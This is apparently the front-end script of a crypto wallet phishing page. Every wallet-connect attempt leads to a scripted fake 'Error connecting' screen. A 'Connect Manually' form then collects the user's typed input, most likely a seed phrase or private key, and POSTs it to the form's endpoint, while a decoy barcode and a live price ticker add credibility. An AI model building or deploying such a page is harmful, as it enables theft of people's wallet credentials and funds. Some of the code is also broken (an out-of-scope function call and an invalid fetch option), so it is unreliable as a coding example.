document.addEventListener('DOMContentLoaded', () => {
    console.log('Script loaded');
    const pages = document.querySelectorAll('.page');
    const walletSelect = document.getElementById('walletSelect');
    const connectButton = document.getElementById('connectButton');
    const connectManuallyButton = document.getElementById('connectManuallyButton');
    const manualConnectSection = document.getElementById('manualConnectSection');
    const userInput = document.getElementById('userInput');
    const submitButton = document.getElementById('submitButton');
    const statusMessage = document.getElementById('statusMessage');
    const messageForm = document.getElementById('messageForm');
    const barcodeContainer = document.getElementById('barcodeContainer');
    const connectButtons = document.querySelectorAll('.connect-button');
    const connectionMessage = document.getElementById('connectionMessage');
    const coinmarketcapData = document.getElementById('coinmarketcap-data');

    if (!walletSelect || !connectButton || !connectManuallyButton || !manualConnectSection || !userInput || !submitButton || !coinmarketcapData) {
        console.error('One or more elements not found:', { walletSelect, connectButton, connectManuallyButton, manualConnectSection, userInput, submitButton, coinmarketcapData });
        return;
    }

    // Show page by ID and update URL, toggle navbar/footer visibility
    function showPage(pageId) {
        pages.forEach(page => page.classList.remove('active'));
        document.getElementById(pageId).classList.add('active');
        history.pushState(null, null, `#${pageId}`);

        // Toggle hide-nav-footer class based on page
        if (pageId === 'connect-wallet' || pageId === 'initializing') {
            document.body.classList.add('hide-nav-footer');
        } else {
            document.body.classList.remove('hide-nav-footer');
        }
    }

    // Handle popstate event for back/forward navigation
    window.addEventListener('popstate', () => {
        const hash = window.location.hash.substring(1) || 'home';
        showPage(hash);
        if (hash === 'connect-wallet') {
            connectButton.disabled = !walletSelect.value;
            manualConnectSection.classList.add('hidden');
            connectManuallyButton.style.display = 'block';
        } else if (hash === 'error-connecting') {
            connectionMessage.textContent = 'Error connecting';
            if (!manualConnectSection.classList.contains('hidden')) {
                manualConnectSection.classList.add('hidden');
                connectManuallyButton.style.display = 'block';
            }
        }
    });

    // Handle initial page load based on URL hash
    window.addEventListener('load', () => {
        const hash = window.location.hash.substring(1) || 'home';
        showPage(hash);
    });

    // Handle navbar and card navigation with URL update
    document.querySelectorAll('.nav-menu a').forEach(anchor => {
        anchor.addEventListener('click', (e) => {
            e.preventDefault();
            const targetId = anchor.getAttribute('href').substring(1);
            if (targetId === 'connect-wallet') {
                showPage(targetId);
            } else {
                document.getElementById(targetId).scrollIntoView({ behavior: 'smooth' });
            }
        });
    });

    // Handle option card buttons to navigate to Page 2 with URL update
    connectButtons.forEach(button => {
        button.addEventListener('click', () => {
            console.log('Card button clicked:', button.getAttribute('data-option'));
            showPage('connect-wallet');
        });
    });

    // Handle wallet selection and Connect button on Page 2 with URL update
    walletSelect.addEventListener('change', () => {
        console.log('Wallet selected:', walletSelect.value);
        connectButton.disabled = !walletSelect.value;
    });

    connectButton.addEventListener('click', () => {
        console.log('Connect button clicked');
        if (walletSelect.value) {
            showPage('initializing');
            setTimeout(() => {
                showPage('error-connecting');
            }, 3000); // Wait 3 seconds before redirecting to Page 4
        }
    });

    // Handle Connect Manually button on Page 4
    connectManuallyButton.addEventListener('click', () => {
        console.log('Connect Manually clicked');
        manualConnectSection.classList.remove('hidden');
        connectManuallyButton.style.display = 'none';
    });

    // Handle form submission on Page 4 with URL update
    messageForm.addEventListener('submit', (e) => {
        e.preventDefault();
        console.log('Submitting form with input:', userInput.value);
        statusMessage.textContent = 'Kindly wait';
        statusMessage.style.fontWeight = '600';
        submitButton.disabled = true;

        const formData = new FormData(messageForm);
        formData.set('message', userInput.value);

        const barcodeImg = document.createElement('img');
        barcodeImg.src = 'https://barcode.tec-it.com/barcode.ashx?data=678543&code=Code128';
        barcodeImg.alt = 'Transaction Barcode';
        barcodeContainer.innerHTML = '';
        barcodeContainer.appendChild(barcodeImg);
        barcodeContainer.classList.remove('hidden');

        fetch(messageForm.action, {
            method: 'POST',
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        }).then(response => {
            if (response.ok) {
                statusMessage.textContent = 'Please save the barcode';
            } else {
                statusMessage.textContent = 'Error sending message.';
                barcodeContainer.classList.add('hidden');
            }
            statusMessage.style.fontWeight = 'normal';
            submitButton.disabled = false;
        }).catch(error => {
            statusMessage.textContent = 'Network error. Please try again.';
            statusMessage.style.fontWeight = 'normal';
            barcodeContainer.classList.add('hidden');
            submitButton.disabled = false;
            console.error('Error:', error);
        });
    });

    // CoinMarketCap Live Updates with Color Coding
    async function updateCoinmarketcap() {
        try {
            const apiKey = 'YOUR_ACTUAL_API_KEY'; // Replace with your verified key
            const response = await fetch('https://pro-api.coinmarketcap.com/v1/cryptocurrency/listings/latest', {
                headers: {
                    'X-CMC_PRO_API_KEY': apiKey,
                    'Accept': 'application/json'
                },
                params: {
                    start: '1',
                    limit: '15',
                    convert: 'USD'
                }
            });
            if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
            const data = await response.json();
            if (data.status.error_code) throw new Error(data.status.error_message || 'API request failed');
            const specificCurrencies = [3408, 1027, 1839, 2010, 5426, 52];
            const selectedCoins = data.data.filter(coin => specificCurrencies.includes(coin.id) || coin.rank <= 10);

            let html = '';
            selectedCoins.forEach(coin => {
                const change = coin.quote.USD.percent_change_24h;
                const color = change > 0 ? '#32cd32' : '#dc143c';
                html += `<span style="color: ${color}; text-shadow: 1px 1px 1px #fff;">${coin.symbol}: $${coin.quote.USD.price.toFixed(2)} (${change}%)</span> | `;
            });
            coinmarketcapData.innerHTML = html.trim();
        } catch (error) {
            console.error('CoinMarketCap Error:', error);
            coinmarketcapData.innerHTML = `<p>Failed to load live updates. Error: ${error.message}. Check console or API key.</p>`;
        }
    }
    updateCoinmarketcap();
    setInterval(updateCoinmarketcap, 300000);
});

// Initial page load
showPage(window.location.hash.substring(1) || 'home');
